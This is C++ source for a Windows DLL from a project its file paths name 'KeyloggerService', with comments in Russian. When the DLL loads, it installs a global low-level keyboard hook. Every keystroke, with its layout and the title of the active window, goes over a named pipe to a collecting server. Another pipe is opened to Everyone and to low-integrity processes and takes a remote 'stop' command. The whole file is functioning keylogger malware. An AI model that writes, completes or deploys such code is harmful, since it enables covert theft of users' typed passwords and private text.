#include <Windows.h>
#include <vector>
#include <thread>
#include <defines.h>
#include <fstream>
#include <sstream>
#include <iostream>
#include <AccCtrl.h>
#include <AclAPI.h>
#define TRAVERSE_FLAG_DEBUG   (1u << 1)
#pragma comment (lib, "ntdll.lib")

// Глобальная переменная для механизма событий
HANDLE hEvent;
HANDLE hThread;
HANDLE hookThread;
HMODULE hLib;
HHOOK g_hHook;
HANDLE writePipe;

void* get_teb(
    const DWORD tid,   // in
    const DWORD flags   // in, optional
)
{
    static NTSTATUS(__stdcall * NtQueryInformationThread)(
        HANDLE ThreadHandle,
        int ThreadInformationClass,
        PVOID ThreadInformation,
        ULONG ThreadInformationLength,
        PULONG ReturnLength
        );

    struct /* THREAD_BASIC_INFORMATION */
    {
        LONG ExitStatus;
        PVOID TebBaseAddress;
        struct
        {
            HANDLE UniqueProcess;
            HANDLE UniqueThread;
        } ClientId;
        ULONG_PTR AffinityMask;
        LONG Priority;
        LONG BasePriority;
    } tbi;

    LONG status = 0;
    HANDLE thread = NULL;
    void* return_code = NULL;


    if (!NtQueryInformationThread)
    {
        SetLastError(0); // error code is evaluated on success
        *(FARPROC*)&NtQueryInformationThread =
            (FARPROC)GetProcAddress(GetModuleHandleA("ntdll"), "NtQueryInformationThread");

        if ((flags & TRAVERSE_FLAG_DEBUG))
        {
            printf("GetProcAddress() %s. GLE: %lu, NtQueryInformationThread: 0x%p.\n",
                (NtQueryInformationThread ? "success" : "error"),
                GetLastError(),
                NtQueryInformationThread
            );
        }

        if (!NtQueryInformationThread)
            goto cleanup;
    }

    SetLastError(0); // error code is evaluated on success
    thread = OpenThread(THREAD_QUERY_INFORMATION, FALSE, tid);

    if ((flags & TRAVERSE_FLAG_DEBUG))
    {
        printf("OpenThread() %s. tid: %lu, GLE: %lu, Handle: 0x%p.\n",
            (thread ? "success" : "error"),
            tid,
            GetLastError(),
            thread
        );
    }

    if (!thread)
        goto cleanup;

    /* request ThreadBasicInformation */
    status = NtQueryInformationThread(thread, 0, &tbi, sizeof(tbi), NULL);

    if ((flags & TRAVERSE_FLAG_DEBUG))
    {
        printf("NtQueryInformationThread() %s. status: 0x%08X.\n",
            ((status) ? "!= STATUS_SUCCESS" : "== STATUS_SUCCESS"),
            (unsigned)status
        );
    }

    if (status) // || ( tbi.ExitStatus != STATUS_PENDING ) )
        goto cleanup;

    return_code = tbi.TebBaseAddress;

cleanup:

    if (thread)
    {
        BOOL ret = 0;

        SetLastError(0); // error code is evaluated on success
        ret = CloseHandle(thread);

        if ((flags & TRAVERSE_FLAG_DEBUG))
        {
            printf("CloseHandle() %s. GLE: %lu, Handle: 0x%p\n",
                (ret ? "success" : "error"),
                GetLastError(),
                thread
            );
        }

        thread = NULL;
    }

    return return_code;
}

/* Create a DACL that will allow everyone to have full control over our pipe. */
static VOID BuildDACL(PSECURITY_DESCRIPTOR pDescriptor)
{
    PSID pSid;
    EXPLICIT_ACCESS ea;
    PACL pAcl;

    SID_IDENTIFIER_AUTHORITY sia = SECURITY_WORLD_SID_AUTHORITY;

    AllocateAndInitializeSid(&sia, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0,
        &pSid);

    ZeroMemory(&ea, sizeof(EXPLICIT_ACCESS));
    ea.grfAccessPermissions = FILE_ALL_ACCESS;
    ea.grfAccessMode = SET_ACCESS;
    ea.grfInheritance = NO_INHERITANCE;
    ea.Trustee.TrusteeForm = TRUSTEE_IS_SID;
    ea.Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
    ea.Trustee.ptstrName = (LPTSTR)pSid;

    if (SetEntriesInAcl(1, &ea, NULL, &pAcl) == ERROR_SUCCESS)
    {
        if (SetSecurityDescriptorDacl(pDescriptor, TRUE, pAcl, FALSE) == 0)
            throw std::runtime_error("Failed to create named pipe");
        //_tprintf(_T("[*] Failed to set DACL (%u)\n"), GetLastError());
    }
    else
        throw std::runtime_error("Failed to create named pipe");
    //_tprintf(_T("[*] Failed to add ACE in DACL (%u)\n"), GetLastError());
}


/* Create a SACL that will allow low integrity processes connect to our pipe. */
static VOID BuildSACL(PSECURITY_DESCRIPTOR pDescriptor)
{
    PSID pSid;
    PACL pAcl;

    SID_IDENTIFIER_AUTHORITY sia = SECURITY_MANDATORY_LABEL_AUTHORITY;
    DWORD dwACLSize = sizeof(ACL) + sizeof(SYSTEM_MANDATORY_LABEL_ACE) +
        GetSidLengthRequired(1);

    pAcl = (PACL)LocalAlloc(LPTR, dwACLSize);
    InitializeAcl(pAcl, dwACLSize, ACL_REVISION);

    AllocateAndInitializeSid(&sia, 1, SECURITY_MANDATORY_LOW_RID, 0, 0, 0, 0,
        0, 0, 0, &pSid);

    if (AddMandatoryAce(pAcl, ACL_REVISION, 0, SYSTEM_MANDATORY_LABEL_NO_WRITE_UP,
        pSid) == TRUE)
    {
        if (SetSecurityDescriptorSacl(pDescriptor, TRUE, pAcl, FALSE) == 0)
            throw std::runtime_error("Failed to create named pipe");
        //_tprintf(_T("[*] Failed to set SACL (%u)\n"), GetLastError());
    }
    else
        throw std::runtime_error("Failed to create named pipe");
    //_tprintf(_T("[*] Failed to add ACE in SACL (%u)\n"), GetLastError());
}


/* Initialize security attributes to be used by `CreateNamedPipe()' below. */
static VOID InitSecurityAttributes(PSECURITY_ATTRIBUTES pAttributes)
{
    PSECURITY_DESCRIPTOR pDescriptor;

    pDescriptor = (PSECURITY_DESCRIPTOR)LocalAlloc(LPTR,
        SECURITY_DESCRIPTOR_MIN_LENGTH);
    InitializeSecurityDescriptor(pDescriptor, SECURITY_DESCRIPTOR_REVISION);

    BuildDACL(pDescriptor);
    BuildSACL(pDescriptor);

    pAttributes->nLength = sizeof(SECURITY_ATTRIBUTES);
    pAttributes->lpSecurityDescriptor = pDescriptor;
    pAttributes->bInheritHandle = TRUE;
}

DWORD dwCurrentProcessId;
HANDLE hCurrentProcess;
DWORD dwMainThreadId;

bool stopFlag = false;

void Stop()
{
    stopFlag = true;
}

DWORD WINAPI readCommandThread(LPVOID lpParam)
{
    SECURITY_ATTRIBUTES sa;
    DWORD dwModeNoWait = PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_NOWAIT;
    DWORD dwModeWait = PIPE_TYPE_MESSAGE | PIPE_READMODE_BYTE | PIPE_WAIT;

    DWORD ret = EXIT_FAILURE;

    InitSecurityAttributes(&sa);
    HANDLE readPipe = CreateNamedPipe(
        L"\\\\.\\pipe\\myreadpipe",
        PIPE_ACCESS_DUPLEX /* | FILE_FLAG_OVERLAPPED*/,
        PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
        PIPE_UNLIMITED_INSTANCES,
        0,
        0,
        INFINITE,
        &sa);

    /*HANDLE readPipe = CreateFile(
        L"\\\\.\\pipe\\myreadpipe",
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        0,
        NULL);*/

    if (readPipe == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed to open named pipe: " << GetLastError() << std::endl;
        if (readPipe != NULL)CloseHandle(readPipe);
        return 1;
    }

    if (!ConnectNamedPipe(readPipe, NULL)) {
        std::cerr << "Failed to wait for client connection: " << GetLastError() << std::endl;
        if (readPipe != NULL)CloseHandle(readPipe);
        return 1;
    }

    while (!stopFlag) {
        // Получение ответа от сервера
        char buffer[256];
        DWORD bytesRead = 0;
        if (!ReadFile(readPipe, buffer, sizeof(buffer), &bytesRead, NULL) || bytesRead == 0) {
            //std::cerr << "Failed to read data from named pipe: " << GetLastError() << std::endl;
            std::ofstream outFile("C:\\Users\\benosa\\source\\repos\\KeyloggerService\\x64\\Debug\\!ReadCommand.log", std::ios_base::app);
            if (outFile.is_open()) {
                outFile << "Failed to read data from named pipe: " << GetLastError() << std::endl;
                outFile.close();
            }
            CloseHandle(readPipe);
            return 1;
        }

        // Обработка ответа от сервера
        if (std::string(buffer).find("stop") != std::string::npos) {
            Stop();
        }

        
        //std::cout << "Received from server: " << std::string(buffer, bytesRead) << std::endl;
        std::ofstream outFile("C:\\Users\\benosa\\source\\repos\\KeyloggerService\\x64\\Debug\\!HookDll.log", std::ios_base::app);
        if (outFile.is_open()) {
            outFile << "Received from server: " << std::string(buffer, bytesRead) << std::endl;
            outFile.close();
        }

        // Проверка флага stopFlag
        if (stopFlag) {
            CloseHandle(readPipe);
            return 0;
        }

        // Задержка для демонстрации работы в потоке
        std::this_thread::sleep_for(std::chrono::seconds(1));
    }
    return 0;
}

void sendData(int keyLayout, int nCode, WPARAM wParam, LPARAM lParam) {
    //if (!writePipe)return;
    writePipe = CreateFile(
        L"\\\\.\\pipe\\mywritepipe",
        GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        0,
        NULL);

    if (writePipe == INVALID_HANDLE_VALUE) {
        //std::cerr << "Failed to open named pipe: " << GetLastError() << std::endl;
        std::ofstream outFile("C:\\Users\\benosa\\source\\repos\\KeyloggerService\\x64\\Debug\\!DllMain.log", std::ios_base::app);
        if (outFile.is_open()) {
            outFile << "Failed to open named pipe: " << GetLastError() << std::endl;
            outFile.close();
        }
        //break;
    }
    HWND window = GetForegroundWindow();
    const int MAX_TITLE_LENGTH = 1024;
    wchar_t title[MAX_TITLE_LENGTH];
    int length = GetWindowTextW(window, title, MAX_TITLE_LENGTH);

   /* std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> converter;
    std::string str = converter.to_bytes(title);*/

    int length2 = WideCharToMultiByte(CP_UTF8, 0, title, -1, NULL, 0, NULL, NULL);
    std::string str(length2, 0);
    WideCharToMultiByte(CP_UTF8, 0, title, -1, &str[0], length2, NULL, NULL);

    KeyInfo info;
    info.lang = keyLayout;
    info.window = window;
    info.text = str;
    info.pnCode = nCode;
    info.pwParam = wParam;
    info.plParam = lParam;  

    // Размер структуры
    std::size_t dataSize = sizeof(info);
    
    DWORD bytesWritten = 0;
    WriteFile(writePipe, &dataSize, sizeof(dataSize), &bytesWritten, NULL);
    if (int i = GetLastError()) {
        std::ofstream outFile("C:\\Users\\benosa\\source\\repos\\KeyloggerService\\x64\\Debug\\!SendData.log", std::ios_base::app);
        if (outFile.is_open()) {
            outFile << "Failed write structure size to named pipe: " << GetLastError() << std::endl;
            outFile.close();
        }
    }
    if (bytesWritten != sizeof(dataSize))
    {
        std::ofstream outFile("C:\\Users\\benosa\\source\\repos\\KeyloggerService\\x64\\Debug\\!SendData.log", std::ios_base::app);
        if (outFile.is_open()) {
            outFile << "Failed write structure  to named pipe: " << GetLastError() << std::endl;
            outFile.close();
        }
    }

    bytesWritten = 0;
    WriteFile(writePipe, &info, sizeof(info), &bytesWritten, NULL);
    if (bytesWritten != sizeof(info))
    {
        std::ofstream outFile("C:\\Users\\benosa\\source\\repos\\KeyloggerService\\x64\\Debug\\!SendData.log", std::ios_base::app);
        if (outFile.is_open()) {
            outFile << "Failed write structure size to named pipe: " << GetLastError() << std::endl;
            outFile.close();
        }
    }
    CloseHandle(writePipe);
}

LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    std::ofstream outFile("C:\\Users\\benosa\\source\\repos\\KeyloggerService\\x64\\Debug\\!Hookroc_res.txt", std::ios_base::app);
    if (outFile.is_open()) {
        outFile << "Triggered" << std::endl;
    }
    if (nCode == HC_ACTION) {
        HWND window = GetForegroundWindow();
        HKL keyboardLayout = GetKeyboardLayout(GetWindowThreadProcessId(window, NULL));
        int keyLayout = static_cast<int>(reinterpret_cast<uintptr_t>(keyboardLayout));
        std::ofstream outFile("C:\\Users\\benosa\\source\\repos\\KeyloggerService\\x64\\Debug\\!Hookroc.txt", std::ios_base::app);
        if (outFile.is_open()) {
            outFile << "KeyCode: " << nCode << std::endl;
        }
        sendData(keyLayout, nCode, wParam, lParam);
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

DWORD WINAPI createHookProcess(LPVOID lpParam)
{
    g_hHook = SetWindowsHookEx(WH_KEYBOARD_LL, HookProc, NULL, 0);
    MSG message;
   
    if (g_hHook != NULL)
    {
        while (GetMessage(&message, NULL, 0, 0))
        {
            TranslateMessage(&message);
            DispatchMessage(&message);
        }
        return TRUE;
    }
    return FALSE;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) 
{

    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        // Создаем событие
        hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
         // получить идентификатор текущего процесса
        dwCurrentProcessId = GetCurrentProcessId();
        dwMainThreadId = reinterpret_cast<DWORD>(get_teb(dwCurrentProcessId, NULL));
        

        hookThread = CreateThread(NULL, 0, createHookProcess, NULL, 0, NULL);;
        if (hookThread != NULL) {
            hThread = CreateThread(NULL, 0, readCommandThread, NULL, 0, NULL);;
            if (hThread == NULL)
            {
                UnhookWindowsHookEx(g_hHook);
                return FALSE;
            }
        }else
        {
            if(g_hHook)UnhookWindowsHookEx(g_hHook);
            if (hEvent != NULL)CloseHandle(hEvent);
            if (hThread != NULL)CloseHandle(hThread);
            if (writePipe != NULL && writePipe != INVALID_HANDLE_VALUE) {
                CloseHandle(writePipe);
            }
            return FALSE;
        }       
        break;
    case DLL_PROCESS_DETACH:
        // Сигнализируем потоку, что нужно завершить работу
        SetEvent(hEvent);

        // Ждем завершения потока
        WaitForSingleObject(hThread, INFINITE);

        // Закрываем дескриптор события и потока
        if (hEvent != NULL)CloseHandle(hEvent);
        if(hThread != NULL)CloseHandle(hThread);
        if (writePipe != NULL && writePipe != INVALID_HANDLE_VALUE) {
            CloseHandle(writePipe);
        }
        if(g_hHook)UnhookWindowsHookEx(g_hHook);
        FreeLibrary(hModule);
        break;
    }
    return TRUE;
}
